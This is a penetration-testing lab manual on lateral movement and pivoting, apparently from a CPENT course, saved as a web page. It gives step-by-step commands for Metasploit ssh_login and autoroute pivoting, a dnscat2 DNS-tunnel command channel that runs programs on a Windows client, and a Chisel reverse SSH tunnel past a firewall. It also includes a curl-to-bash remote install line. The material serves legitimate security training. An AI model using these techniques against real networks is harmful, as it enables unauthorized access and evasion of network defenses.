+  <p>We can see the DNS traffic between Client machine i.e <strong>192.168.0.100</strong> and Pentester machine <strong>192.168.0.18</strong>.</p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/njoiappm.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex64"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex64"><span></span></label> Click on any one of the captured packets to view the DNS queries in detail, as shown in the provided screenshot.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/u48smrmr.jpg" alt="u48smrmr.jpg"></p></li>
+<li class="task-list-item" id="taskIndex65"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex65"><span></span></label> This concludes DNS tunneling using DNSCAT2 exercise.</p></li>
+</ol>
+</div><div class="page" id="page3">
+<h1 id="exercise-3--http-tunneling-using-chisel">Exercise: 3  HTTP Tunneling Using Chisel</h1>
+<p><strong>Overview of Chisel</strong></p>
+<p>Chisel is a fast TCP/UDP tunnel that works by creating a direct HTTP/S tunnel between two systems, enabling the transfer of network traffic over HTTP/S ports, which are often open through firewalls. It is used primarily for bypassing restrictive network firewalls and tunneling traffic securely between machines.</p>
+<p>HTTP tunneling is a technique used to encapsulate non-HTTP traffic, such as SSH, within HTTP or HTTPS requests to bypass firewalls that block certain ports. In this lab, we will use Chisel, a fast tunneling tool, to establish a reverse SSH tunnel. </p>
+<p>The objective of this lab is to demonstrate how HTTP tunneling can bypass restrictive firewalls by encapsulating traffic within HTTP/S. The Ubuntu machine (client) will initiate a connection to the Parrot Security machine (server) over HTTP (port 80), allowing SSH traffic to pass through the tunnel, even though the firewall blocks direct SSH access. This method enables secure communication between machines, bypassing network restrictions.</p>
+<h3 id="lab-tasks-2">Lab Tasks</h3>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex66"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex66"><span></span></label> Launch <strong>Parrot Security VM</strong> by clicking on <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a>, By default <strong>pentester</strong> account is selected.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/a06g5osh.jpg" alt="a06g5osh.jpg"></p></li>
+<li class="task-list-item" id="taskIndex67"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex67"><span></span></label> Type <strong>toor</strong> in the password field and press <strong>Enter</strong>.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/b6iou7gr.jpg" alt="b6iou7gr.jpg"></p></li>
+<li class="task-list-item" id="taskIndex68"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex68"><span></span></label> Right-click on the desktop and click on <strong>Open in terminal</strong> to open the terminal.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/i2hqvyfg.jpg" alt="i2hqvyfg.jpg"></p></li>
+<li class="task-list-item" id="taskIndex69"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex69"><span></span></label> Type <strong>sudo su</strong> and press enter. </p></li>
+<li class="task-list-item" id="taskIndex70"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex70"><span></span></label> Type <strong>toor</strong> when prompted for a password, and press Enter to gain root privileges.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/h7ra6rlt.jpg" alt="h7ra6rlt.jpg"></p></li>
+<li class="task-list-item" id="taskIndex71"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex71"><span></span></label> Now launch Ubuntu Machine by clicking on <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="270561">Ubuntu</a>, By default, the <strong>Ubuntu</strong> account will be selected.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/n4lmdl1n.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex72"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex72"><span></span></label> Type <strong>toor</strong> in the password field and press <strong>Enter</strong>.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/oi4konml.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex73"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex73"><span></span></label> Right-click on the desktop and click on <strong>Open in terminal</strong> to open the terminal.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/zcyiy1b4.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex74"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex74"><span></span></label> Type <strong>sudo su</strong> in the terminal and press enter. </p></li>
+<li class="task-list-item" id="taskIndex75"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex75"><span></span></label> Type <strong>toor</strong> when prompted for a password, and press Enter to gain root privileges.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/z5z3n20y.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex76"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex76"><span></span></label> Enable the <strong>Uncomplicated Firewall (UFW)</strong> on the Ubuntu machine and configure firewall rules to allow only HTTP and HTTPS traffic by running the following commands:</p>
+<ul>
+<li><p>ufw enable</p></li>
+<li><p>ufw allow 80/tcp</p></li>
+<li><p>ufw allow 443/tcp</p></li></ul>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/4yqbszjj.jpg" alt="Screenshot"></p>
+<blockquote class="knowledge">
+  <p>This configuration ensures that only HTTP (port 80) and HTTPS (port 443) traffic is allowed through the firewall, blocking other types of traffic like SSH by default.</p>
+</blockquote><div class="moreKnowledge"><a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="moreKnowledgeLink" style="display: none;">more...</a></div></li>
+<li class="task-list-item" id="taskIndex77"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex77"><span></span></label> Add a new user <strong>bob</strong> on the Ubuntu Machine using the following command: <strong>sudo adduser bob</strong></p>
+<blockquote class="note">
+  <p>Set Password as <strong>Bob@123</strong> and leave the remaining fields blank and press <strong>Enter</strong>. If you get <strong>Is the information correct ? [Y/N]</strong> type <em>Y</em> and press <strong>Enter</strong></p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/lu101qat.jpg" alt="Screenshot"></p>
+<blockquote class="note">
+  <p>This creates a new user account, <strong>bob</strong>, which will be used for SSH login after tunneling is established.</p>
+</blockquote></li>
+<li class="task-list-item" id="taskIndex78"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex78"><span></span></label> Switch back to <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a> VM and test SSH access to the Ubuntu machine.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/ctc4ldyd.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex79"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex79"><span></span></label> Try to SSH into the Ubuntu machine using the following command: <strong>ssh bob@192.168.0.19</strong>. This should fail because the firewall on the Ubuntu machine is blocking SSH traffic (port 22).</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/2vwmkvvz.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex80"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex80"><span></span></label> Now install Chisel on Both machines to enable tunneling and bypass these firewall restrictions. On both Parrot Security and <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="270561">Ubuntu</a>, run the following command to install Chisel:</p>
+<p><strong>curl https://i.jpillora.com/chisel! | bash</strong></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/pcctq2ua.jpg" alt="Screenshot"></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/25s5m1ul.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex81"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex81"><span></span></label> On the <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a> machine, start the Chisel server in reverse tunneling mode with the following command:</p>
+<p><strong>sudo chisel server -p 80 --reverse</strong></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/arkpk1bd.jpg" alt="Screenshot"></p>
+<blockquote class="knowledge">
+  <p>This command sets up Chisel to listen on port 80 (the standard HTTP port) and enables reverse tunneling, which means the Ubuntu machine will connect to this server to create a tunnel for forwarding SSH traffic.</p>
+</blockquote><div class="moreKnowledge"><a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="moreKnowledgeLink" style="display: none;">more...</a></div></li>
+<li class="task-list-item" id="taskIndex82"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex82"><span></span></label> On the <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="270561">Ubuntu</a> machine, start the Chisel client, and set up a reverse SSH tunnel by running the following command:</p>
+<p><strong>chisel client 192.168.0.18:80 R:2222:127.0.0.1:22</strong></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/hiddfi2j.jpg" alt="Screenshot"></p>
+<blockquote class="knowledge">
+  <p>This command creates a reverse SSH tunnel, forwarding SSH traffic (port 22) from the Ubuntu machine to port 2222 on the Parrot machine. The R:2222:127.0.0.1:22 option tells Chisel to forward traffic from port 2222 on the Parrot machine to port 22 (SSH) on the local machine (Ubuntu).</p>
+</blockquote><div class="moreKnowledge"><a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="moreKnowledgeLink" style="display: none;">more...</a></div></li>
+<li class="task-list-item" id="taskIndex83"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex83"><span></span></label> Now both the server <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a> and client <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="270561">Ubuntu</a> are connected via HTTP tunneling. </p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/nl24owxx.jpg" alt="Screenshot"></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/sd4id3if.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex84"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex84"><span></span></label> In the <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a> machine, open the new terminal.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/iqezl3ig.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex85"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex85"><span></span></label> Now, try to SSH into the Ubuntu machine through the forwarded tunnel from the <strong>Parrot Security</strong> by running:</p>
+<p><strong>ssh -p 2222 bob@127.0.0.1</strong></p>
+<blockquote class="note">
+  <p>Type <strong>Yes</strong> and enter Password as <strong>Bob@123</strong>.</p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/u4vyayxs.jpg" alt="Screenshot"></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/rkh313zd.jpg" alt="Screenshot"></p>
+<blockquote class="knowledge">
+  <p>This command connects to the Ubuntu machine using the SSH service forwarded over the HTTP tunnel. The -p 2222 option specifies the port on the Parrot machine to connect to, while 127.0.0.1 directs the traffic to the local tunnel endpoint.</p>
+</blockquote><div class="moreKnowledge"><a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="moreKnowledgeLink" style="display: none;">more...</a></div></li>
+<li class="task-list-item" id="taskIndex86"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex86"><span></span></label> Open Wireshark and double-click <strong>eth0</strong> to capture tunneling traffic between the client and pentester machines. If it asks for a password, type <strong>toor</strong> as the password.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/ejt5sblx.jpg" alt="Screenshot"></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/khym5tz2.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex87"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex87"><span></span></label> In the Filter bar, type <strong>tcp.port == 80</strong> to filter HTTP Tunnelling traffic between Client machine i.e <strong>192.168.0.19</strong> and Pentester machine <strong>192.168.0.18</strong>.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/2x5n2bf0.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex88"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex88"><span></span></label> Click on any one of the captured packets to view the HTTP requests in detail.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/bfrpb5j2.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex89"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex89"><span></span></label> By completing this lab, you have successfully used Chisel to bypass firewall restrictions and establish a secure reverse SSH tunnel over HTTP. This exercise demonstrates the importance of understanding tunneling techniques in penetration testing.</p></li>
+</ol></div></div>
+    </div>
+    <input type="hidden" id="rawContent" value="#Module 12: Lateral Movement and Pivoting
+
+##Scenario
+Lateral movement is the process of navigating within a compromised network to gain access to additional systems, accounts, or data. This step is critical in penetration testing as it mimics real-world attacker behavior after initial access is achieved. It helps uncover hidden vulnerabilities, misconfigurations, and weak access controls that could be exploited to expand the attack surface. Testing lateral movement techniques, such as Pass-the-Hash, Pass-the-Ticket, or exploiting poorly segmented networks, provides organizations with valuable insights into their internal defenses and highlights areas where network segregation, privilege restrictions, or monitoring need improvement.
+
+Pivoting allows penetration testers to use a compromised system as a springboard to access other systems that are otherwise inaccessible. It demonstrates how attackers exploit trust relationships, misconfigured firewalls, or weak credentials to infiltrate deeper into the network. Pivoting helps assess the robustness of segmentation and access control mechanisms in environments such as demilitarized zones (DMZs) or isolated internal segments. By simulating pivoting techniques, penetration testers can identify potential chokepoints and recommend measures to limit an attacker’s ability to move laterally, ensuring that a breach in one area does not compromise the entire network.
+
+##Lab Objectives
+
+Students will learn how to perform:
+
+- Pivoting using Metasploit
+
+- DNS tunneling Using DNSCAT2
+
+- HTTP Tunneling Using Chisel
+
+&gt;[!alert] **Note:** All lab manuals are accessible in the **Lab Manuals** folder located on the **Desktop** of the machines. Please refer to the respective lab manual if you need to copy and paste any commands or code during the lab sessions.
+===
+
+#Exercise 1: Perform Pivoting using Metasploit 
+
+If you exploit a vulnerable system using Metasploit and establish the meterpreter session, you have the option to use this session to pivot to other systems using **route** command or **autoroute** module. Once you have the session, then you can add the route to the network that the victim is connected to right within Metasploit. Since we are working with the concept here, we will use the same approach we did with the previous task, and compromise the Ubuntu machine then we can use it to pivot into the other network. We have the credentials, so we will use the same concept here. Remember, this process does not change. With a pivot, you gain access to a machine, and that machine has two or more network cards, then once you have access, you can “pivot” to the other network which you cannot see.
+
+###Lab Tasks:
+
+1. [] Click @lab.VirtualMachine(ParrotSecurity).SelectLink to switch to the Parrot Security machine and log in with pentester/toor credentials. In the Parrot Security machine open a Terminal window and run **sudo su** command and in the password for the pentester field type **toor** as the password and press **Enter**.
+
+    &gt;[!note] The password you enter will not be visible.
+
+    !IMAGE[Screenshot](screens/npaxvzgn.jpg)
+
+2. [] Run **service postgresql start** to start postgresql service and **msfconsole** commands to launch metasploit.
+
+    !IMAGE[Screenshot](screens/ihxjsgor.jpg)
+
+3. [] Now, in msfconsole run **search** **ssh_login** to search for metasploit modules containing ssh_login. 
+
+4. [] Metasploit will display the modules that contain ssh_login type **use 0** and press **Enter** to use **auxiliary/scanner/ssh/ssh_login** module.
+
+    !IMAGE[Screenshot](screens/3daxqgdl.jpg)
+
+5. [] Type **show options** and press **Enter** to view the **Module options** pertaining to **auxiliary/scanner/ssh/ssh_login**.
+
+    !IMAGE[Screenshot](screens/2thjduvc.jpg)
+
+6. [] Type **set** **USERNAME** **ubuntu** and press **Enter** to set a username for authentication.
+
+7. [] Type **set PASSWORD toor** and press **Enter** to set password for authentication.
+
+8. [] To **set RHOST** type **set RHOST 192.168.0.19** (IP address of **Ubuntu 22.04.3 CPENT** machine) and press **Enter**. 
+
+    !IMAGE[Screenshot](screens/gfresm3k.jpg)
+
+9. [] Type **run** and press **Enter** to run the exploit.
+
+    !IMAGE[Screenshot](screens/52uthoi1.jpg)
+
+10. [] Once the execution is completed, run **sessions -u 1** command to upgrade the current session.
+
+    !IMAGE[Screenshot](screens/2ilriz0z.jpg)
+
+11. [] A new meterpreter session will open run **sessions -l** to view the **Active sessions**.
+
+    !IMAGE[Screenshot](screens/l2qqbg4v.jpg)
+
+12. [] We will now check the IP configuration present in the target machine. Run **sessions -i 2** to interact with session 2.
+
+13. [] A Meterpreter shell opens up, run the **ipconfig** command this will display all the network interfaces in the target machine.
+
+    !IMAGE[Screenshot](screens/asw442y3.jpg)
+
+14. [] We can see that the machine is connected to two network interfaces that are connected to two different subnets 
+
+    !IMAGE[Screenshot](screens/1eqwcxqk.jpg)
+
+15. [] From here, we have two methods to add route to the second subnet of the target machine. 
+
+ - Adding route manually
+
+ - Using autoroute module from Metasploit
+
+**Method 1**
+
+---
+
+16. [] We will now manually add a route to the second interface of the target machine and perform port scanning on the second subnet.
+
+17. [] To do so, in the meterpreter shell run **background** command, to background the session, and in the Metasploit type **route add 10.1.1.0/24 2**, and press **Enter** to add the route, where 10.1.1.0/24 is the second subnet and 2 is the session number.
+
+    !IMAGE[Screenshot](screens/yd0tl4v2.jpg)
+
+18. [] Type **route** and press **Enter** to view the newly created route in Metasploit.
+
+    !IMAGE[Screenshot](screens/c0m34ufo.jpg)
+
+19. [] We will now use **auxiliary/scanner/portscan/tcp** module to perform portscan on the target subnet.
+
+20. [] In Metasploit run the **use auxiliary/scanner/portscan/tcp** command to switch to the **auxiliary/scanner/portscan/tcp** module.
+
+21. [] Now, type **set RHOSTS 10.1.1.0/24** to set RHOSTS for scanning.
+
+22. [] Type **set ports 1-500** to specify the port numbers to scan.
+
+23. [] To set threads run **set threads 50** command.
+
+    !IMAGE[Screenshot](screens/cgza4jue.jpg)
+
+24. [] Now, type a **run** and press **Enter** to perform portscan on the target subnet.
+
+25. [] This will scan the target subnet for open ports. There are two machines in the target subnet, **10.1.1.100** is the IP address of the Ubuntu machine, and **10.1.1.24** is the IP address of the pivot machine (Machine connected to the second subnet i.e. Wordpress Server).
+
+    !IMAGE[Screenshot](screens/k25kghk5.jpg)
+
+**Method-2**
+
+---
+
+26. [] In this Method we will create a route to the second subnet of the target machine using the autoroute module present in Metasploit.
+
+27. [] Considering we already compromised the target Ubuntu machine using the ssh_login module, run the **use post/multi/manage/autoroute** command to switch to the **post/multi/manage/autoroute** module.
+
+28. [] In the post/multi/manage/autoroute module type **show options** and press **Enter** to view the **Module options**.
+
+    !IMAGE[Screenshot](screens/l0mbzb3y.jpg)
+
+29. [] Now, type **set session 2** and press **Enter** to set session 2 to the current module.
+
+30. [] Run **set SUBNET 10.1.1.0/24** command to set 10.1.1.0/24 as subnet.
+
+31. [] Type **run** and press **Enter** to run the module.
+
+    !IMAGE[Screenshot](screens/ptob0p2h.jpg)
+
+32. [] Once the module execution is completed in the metasploit type **route** and press **Enter** to view the newly added route.
+
+    !IMAGE[Screenshot](screens/itvunpq1.jpg)
+
+33. [] You can further use the **auxiliary/scanner/portscan/tcp** module to scan the newly routed subnet for open ports.
+
+===
+
+#Exercise 2:  DNS tunneling Using DNSCAT2
+
+**Overview of DNSCAT2**
+
+DNSCAT2 is a tool for DNS tunneling, allowing attackers to establish a reverse shell or command-and-control channel via DNS queries and responses. It encodes data into DNS queries sent to an attacker-controlled server, which decodes and returns the data. DNSCAT2 can bypass firewalls, as DNS traffic is typically allowed. In this exercise, we will set up a DNSCAT2 server and client, tunnel commands over DNS, and use Wireshark to monitor DNS traffic for data transfer, learning how attackers exploit DNS tunneling for data exfiltration or remote access while avoiding detection.
+
+In this exercise, DNS tunneling is explored using the DNSCAT2 tool. The objective is to demonstrate how DNS queries can be manipulated to establish communication between a client and an attacker, bypassing traditional network security measures. DNS tunneling allows attackers to transfer data over DNS requests, which can bypass firewalls and other security systems that often allow DNS traffic to pass unfiltered.
+
+The goal of this lab is to use DNSCAT2 to establish a covert communication channel between a compromised client machine and a pentester machine using DNS tunneling. Participants will: 
+
+- Set up DNSCAT2 on both the client and pentester machines
+
+- Use DNSCAT2 to send and receive data between the two systems
+
+- Capture DNS traffic using Wireshark to monitor the communication
+
+- Gain shell access on the client machine via the DNS tunneling connection
+
+- Understand the underlying concepts and techniques used in DNS tunneling
+
+###Lab Tasks
+
+1. [] Launch @lab.VirtualMachine(Windows11(SecureBootDisabled)).SelectLink Virtual Machine as a client.
+
+    !IMAGE[Screenshot](screens/5b3lb5rk.jpg)
+
+2. [] Click @lab.CtrlAltDelete link to activate machine and login with **CPENT** +++Pa$$w0rd+++ and press **Enter** to login. 
+
+    !IMAGE[Screenshot](screens/gsrv3kwn.jpg)
+
+    !IMAGE[Screenshot](screens/rizzlk5b.jpg)
+
+3. [] Launch **Pentester Machine** by clicking on @lab.VirtualMachine(ParrotSecurity).SelectLink. By default, the **pentester** account is selected.
+
+    !IMAGE[a06g5osh.jpg](instructions271670/a06g5osh.jpg)
+
+4. [] Type **toor** in the password field and press **Enter**.
+
+    !IMAGE[b6iou7gr.jpg](instructions271670/b6iou7gr.jpg)
+
+5. [] Right-click on the desktop and click on **Open in terminal** to open the terminal.
+
+    !IMAGE[i2hqvyfg.jpg](instructions271670/i2hqvyfg.jpg)
+
+6. [] Type **sudo su** and press **Enter**, then type **toor** as the password and press **Enter** to gain root privileges..
+
+    !IMAGE[h7ra6rlt.jpg](instructions271670/h7ra6rlt.jpg)
+
+7. [] In the terminal, type **nmap 192.168.0.100** and press **Enter** to establish a connection with the client machine.     
+
+    !IMAGE[Screenshot](screens/zo14f3ji.jpg)
+
+    &gt;[!Note] We can observe that all the ports are in an ignored state, indicating that they are either filtered or blocked by a firewall.
+
+    &gt;[!Note] To bypass the firewall and establish interaction with the client machine [Windows 11], we need to install the Dnscat2 tool on both the client machine and the pentester machine [ParrotSecurity].
+
+8. [] Open the terminal on the pentester machine (Parrot Security) and type the command: **sudo apt install dnscat2-server**, Press Enter to start the installation process. If prompted with &quot;Do you want to continue?&quot;, type **Y** and press Enter to proceed, as shown in the screenshot.
+
+    !IMAGE[Screenshot](screens/qzypcdmb.jpg)
+
+9. [] Type **sudo dnscat2-server --version**, then press Enter to check the installed version of the dnscat2-server.
+
+    &gt;[!Note] Make sure that the versions of both the **dnscat2-server** and **dnscat2-client** are the same.
+
+    !IMAGE[Screenshot](screens/5hnkozyq.jpg)
+
+10. [] Launch @lab.VirtualMachine(Windows11(SecureBootDisabled)).SelectLink Virtual Machine to install **dnscat2-client.**
+
+    !IMAGE[Screenshot](screens/5b3lb5rk.jpg)
+
+11. [] Click @lab.CtrlAltDelete link to login to Windows11 Machine, By default **CPENT** account is selected, click +++Pa$$w0rd+++ and press **Enter** to login. 
+
+    !IMAGE[Screenshot](screens/qmlu3w00.jpg)
+
+12. [] Open Google Chrome and go to the following URL: +++https://github.com/iagox86/dnscat2+++
+ 
+    !IMAGE[Screenshot](screens/utadilje.jpg)
+
+13. [] Scroll down the page and, under the &quot;**Where to get it**&quot; section, click on the **Downloads** link.
+
+    !IMAGE[Screenshot](screens/1zcrqbpx.jpg)
+
+14. [] In the given list of files, select the **dnscat2-v0.07-client-win32.zip** file and click on it to download.
+    
+    &gt;[!Note] Make sure that the versions of both the **dnscat2-server** and **dnscat2-client** are the same.
+
+    !IMAGE[Screenshot](screens/adcxpzli.jpg)
+
+15. [] After downloading, go to the Downloads folder, right-click on the **dnscat2-v0.07-client-win32.zip** file, and select **Extract All** to extract the contents.
+
+    !IMAGE[Screenshot](screens/tklgrsyq.jpg)
+
+16. [] Click on **Extract**. 
+
+    !IMAGE[Screenshot](screens/befdwxxe.jpg)
+
+17. [] In the Password Needed tab, type the password as **password** and click OK to extract the file.
+
+    !IMAGE[Screenshot](screens/nb11b32u.jpg)
+
+18. [] Go to the search bar, type **Wireshark** and press enter to launch the application, as shown in the given screenshot.
+
+    !IMAGE[Screenshot](screens/russ5v0u.jpg)
+
+19. [] Click on the **Ethernet 2** adapter to capture the DNS traffic between the client and pentester machines, and then run it in the background as shown in the below screenshot.
+
+    !IMAGE[Screenshot](screens/fwurqzxx.jpg)
+
+    !IMAGE[Screenshot](screens/porovqyn.jpg)
+
+20. [] Click @lab.VirtualMachine(ParrotSecurity).SelectLink, to switch to Prot Security machine.
+
+21. [] Right-click on the desktop and click on **Open in terminal** to open the terminal.
+
+    !IMAGE[i2hqvyfg.jpg](instructions271670/i2hqvyfg.jpg)
+
+22. Type the following command **sudo dnscat2-server --dns domain=abc.com** to start the dnscat2-server.
+
+    &gt;[!Note] You can specify any domain name here; in this case, we have used abc.com.
+
+    !IMAGE[Screenshot](screens/21j5vnpj.jpg)
+
+23. [] Click @lab.VirtualMachine(Windows11(SecureBootDisabled)).SelectLink to switch to Windows 11 machine.
+
+24. [] Navigate to the folder **C:\Users\cpent\Downloads\dnscat2-v-0.7-client-win32**, type cmd in the address bar, and press Enter to open the Command Prompt in that directory.
+
+    !IMAGE[Screenshot](screens/2xttb4lk.jpg)
+
+25. [] Type the following command **dnscat2-v0.7-client-win32.exe --dns domain=abc.com,server=192.168.0.18** and press enter to establish a session with the dnscat2-server. Here we can see **session established!**
+
+    !IMAGE[Screenshot](screens/vmth2tv5.jpg)
+
+26. [] Switch to **Pentester Machine** by clicking on @lab.VirtualMachine(ParrotSecurity).SelectLink.
+
+27. [] Here in the terminal we can see **New Window is created** and session is established as shown in the given screenshot, Now type **help** to view the list of commands 
+
+    !IMAGE[twpz6abo.jpg](instructions271670/twpz6abo.jpg)
+
+28. [] Type the following command **window -i 1** to interact with the client machine as shown in the given SS.
+
+    !IMAGE[v5csj7o6.jpg](instructions271670/v5csj7o6.jpg)
+
+29. [] Type **help** to view the list of commands.
+
+    &gt;[!Note] Here is the list of commands that attackers can perform after getting access through DNS tunneling.
+
+    !IMAGE[Screenshot](screens/wgfqqnau.jpg)
+
+30. [] To open any .exe file type the following command **exec notepad.exe** to open the notepad.
+
+    &gt;[!Note] In the place of **notepad.exe** we can give any .exe file which is present in the client machine.
+
+    !IMAGE[ksujycdk.jpg](instructions271670/ksujycdk.jpg)
+
+31. [] Click @lab.VirtualMachine(Windows11(SecureBootDisabled)).SelectLink to switch to Windows 11 machine to check whether Notepad is open or not, here we can see that notepad is opened as shown in the screenshot.
+
+    !IMAGE[Screenshot](screens/tv5p0wrc.jpg)
+
+32. [] Open Wireshark to view the captured DNS traffic between the client and pentester machines. In the Filter bar, type the **dns** as shown in the Screenshot.
+    
+    &gt;[!Note] We can see the DNS traffic between Client machine i.e **192.168.0.100** and Pentester machine **192.168.0.18**.
+
+    !IMAGE[Screenshot](screens/njoiappm.jpg)
+
+33. [] Click on any one of the captured packets to view the DNS queries in detail, as shown in the provided screenshot.
+
+    !IMAGE[u48smrmr.jpg](instructions271670/u48smrmr.jpg)
+
+34. [] This concludes DNS tunneling using DNSCAT2 exercise.
+
+===
+
+#Exercise: 3  HTTP Tunneling Using Chisel
+
+**Overview of Chisel**
+
+Chisel is a fast TCP/UDP tunnel that works by creating a direct HTTP/S tunnel between two systems, enabling the transfer of network traffic over HTTP/S ports, which are often open through firewalls. It is used primarily for bypassing restrictive network firewalls and tunneling traffic securely between machines.
+
+HTTP tunneling is a technique used to encapsulate non-HTTP traffic, such as SSH, within HTTP or HTTPS requests to bypass firewalls that block certain ports. In this lab, we will use Chisel, a fast tunneling tool, to establish a reverse SSH tunnel. 
+
+The objective of this lab is to demonstrate how HTTP tunneling can bypass restrictive firewalls by encapsulating traffic within HTTP/S. The Ubuntu machine (client) will initiate a connection to the Parrot Security machine (server) over HTTP (port 80), allowing SSH traffic to pass through the tunnel, even though the firewall blocks direct SSH access. This method enables secure communication between machines, bypassing network restrictions.
+
+###Lab Tasks
+
+1. [] Launch **Parrot Security VM** by clicking on @lab.VirtualMachine(ParrotSecurity).SelectLink, By default **pentester** account is selected.
+
+    !IMAGE[a06g5osh.jpg](instructions271670/a06g5osh.jpg)
+
+2. [] Type **toor** in the password field and press **Enter**.
+
+ !IMAGE[b6iou7gr.jpg](instructions271670/b6iou7gr.jpg)
+
+3. [] Right-click on the desktop and click on **Open in terminal** to open the terminal.
+
+    !IMAGE[i2hqvyfg.jpg](instructions271670/i2hqvyfg.jpg)
+
+4. [] Type **sudo su** and press enter. 
+
+5. [] Type **toor** when prompted for a password, and press Enter to gain root privileges.
+
+    !IMAGE[h7ra6rlt.jpg](instructions271670/h7ra6rlt.jpg)
+
+6. [] Now launch Ubuntu Machine by clicking on @lab.VirtualMachine(Ubuntu22.04.3CPENT).SelectLink, By default, the **Ubuntu** account will be selected.
+
+    !IMAGE[Screenshot](screens/n4lmdl1n.jpg)
+
+7. [] Type **toor** in the password field and press **Enter**.
+
+    !IMAGE[Screenshot](screens/oi4konml.jpg)
+
+8. [] Right-click on the desktop and click on **Open in terminal** to open the terminal.
+
